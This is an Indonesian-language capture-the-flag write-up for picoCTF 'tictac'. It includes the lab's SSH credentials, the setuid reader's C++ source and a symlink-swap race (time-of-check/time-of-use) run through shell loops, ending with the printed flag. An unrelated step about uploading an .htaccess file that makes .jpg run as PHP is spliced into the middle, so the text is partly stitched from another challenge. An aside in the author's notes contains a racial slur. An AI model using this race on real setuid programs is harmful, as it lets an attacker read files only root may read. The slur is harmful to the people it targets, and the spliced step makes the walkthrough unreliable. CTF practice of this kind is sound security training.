# PicoCTF - tictac

**Category:** biner exploitation
**Challenge:** PicoCtf tictac


---


## **Deskripsi**
Seseorang membuat program untuk membaca file teks; kami pikir program membaca file dengan hak istimewa akar tapi tampaknya hanya menerima untuk membaca file yang dimiliki oleh pengguna yang menjalankannya.
sshuntuk saturn.picoctf.net:62649, dan menjalankan biner bernama "txtreader" yang pernah terhubung. Login sebagai ctf-playerdengan password, d8819d45(ini soal ctf nya)

clue : none 

---


## **Tools**
- Firefox Browser
- Terminal Kali


---

## **Langkah-Langkah**

```
saya masuk ke ssh nya 
```
```
sya ketik ls -lh dan outputnya 
ctf-player@pico-chall$ ls -la
total 32
drwxr-xr-x 1 ctf-player ctf-player    20 Feb 27 16:19 .
drwxr-xr-x 1 root       root          24 Aug  4  2023 ..
drwx------ 2 ctf-player ctf-player    34 Feb 27 16:19 .cache
-rw-r--r-- 1 root       root          67 Aug  4  2023 .profile
-rw------- 1 root       root          32 Aug  4  2023 flag.txt
-rw-r--r-- 1 ctf-player ctf-player   912 Mar 16  2023 src.cpp
-rwsr-xr-x 1 root       root       19016 Aug  4  2023 txtreader
```
```
di soal tadi kan katanya ada txtheader yg intinya cuma bisa baca file yg owned by user
tapi setelah dilihat flag.txt ini cuma root bisa baca
```
```                                                                                                                                                                                                                                       
disini saya menemukan adanya source code yaitu src.cpp dan ini isinya
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
  if (argc != 2) {
    std::cerr << "Usage: " << argv[0] << " <filename>" << std::endl;
    return 1;
  }

  std::string filename = argv[1];
  std::ifstream file(filename);                   
  struct stat statbuf;

  // Check the file's status information.
  if (stat(filename.c_str(), &statbuf) == -1) {    
    std::cerr << "Error: Could not retrieve file information" << std::endl;
    return 1;
  }

  // Check the file's owner.
  if (statbuf.st_uid != getuid()) {                
    std::cerr << "Error: you don't own this file" << std::endl;
    return 1;
  }

  // Read the contents of the file.
  if (file.is_open()) {                            
    std::string line;
    while (getline(file, line)) {
      std::cout << line << std::endl;
    }
  } else {
    std::cerr << "Error: Could not open file" << std::endl;
    return 1;
  }

  return 0;
}
```
```
file pertama saya upload lalu saya buka inspect, yg pastinya script tidak berjalan
```
```
dan saya edit post nya dengan mengganti nama file menjadi .htaccess
dan script nya saya ganti jadi
<files "test.jpg">
    AddType application/x-httpd-php .jpg
</files>
```
```
intinya di program itu ad kerentanan yg bisa di eksploitasi pake symlink swap dengan manfaatin celah waktu antara
pembukaan file dan pengecekan
```
```
ak bakal ganti file tujuan pas ditengah jalan pake symlink ini
step 1 aku buat file "cilukbah" yang isinya bebas tapi ku kasih ini "aku outih" (jangan niggers)
step 2 aku buat symlink dengan nama "flip", jadi pas aku ketik ./txtheader flip nanti outputnya yg keluar adalah isi file cilukbah
step 3 aku bakal buat symlink nya gonta ganti dari flag.txt ke cilukbah, dan looping txtheader ny

```
```
langsung kita eksekusi wak
1. for i in {1..1000}; do ln -sf flag.txt flip; ln -sf cilukbah flip; done
disini ak pemanasan untuk antisipasi biar sistem dk erorr dan loop 1000x gonta ganti symlink dari cilukbah ke flag.txt
2. while true; do ln -sf flag.txt flip; ln -sf cilukbah flip; done &
ini biar jalan di latar belakang pake &
3.for i in {1..1000}; do ./txtreader flip; done
langsung di serang pake ini yg jalanin txtheader 1000x
outputny campur aduk dengan si cilukbah tapi alhamdulillah flagny muncul : picoCTF{ToctoU_!s_3a5y_5748402c}
```

---
## **berikut dokumentasinya**
<img width="1920" height="1080" alt="Screenshot_2026-02-27_23_57_31" src="https://github.com/user-attachments/assets/ae18219a-8437-4e16-bd65-98981a6b4c81" />
<img width="1920" height="1080" alt="Screenshot_2026-02-27_23_57_59" src="https://github.com/user-attachments/assets/5458403e-f280-45ea-a822-a95ab787dd95"/>
<img width="1920" height="1080" alt="Screenshot_2026-02-27_23_58_48" src="https://github.com/user-attachments/assets/77f3fe10-9ef7-42d9-9235-2de1aaf98468" />


<img width="1920" height="1080" alt="Screenshot_2026-02-28_00_04_09" src="https://github.com/user-attachments/assets/139abb63-d7dd-4924-b876-4ac45453deb8" />









